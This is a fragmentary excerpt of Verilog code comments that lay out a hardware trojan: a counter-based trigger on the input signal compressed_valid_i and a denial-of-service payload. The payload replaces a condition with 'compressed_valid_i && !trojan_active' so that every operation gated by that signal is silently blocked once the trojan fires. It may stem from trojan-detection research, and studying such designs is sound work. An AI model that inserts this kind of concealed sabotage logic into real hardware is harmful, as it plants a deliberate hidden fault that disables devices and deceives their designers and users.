 ...
 * 
 * Description:
 *   Disables operations by blocking compressed_valid_i control signal
 *   
 * Trigger: Counter on compressed_valid_i
 * Payload: Block compressed_valid_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block compressed_valid_i when trojan is active
//
// IMPORTANT: compressed_valid_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (compressed_valid_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: compressed_valid_i && 0 = 0 (always false)
//   All operations controlled by compressed_valid_i are blocked
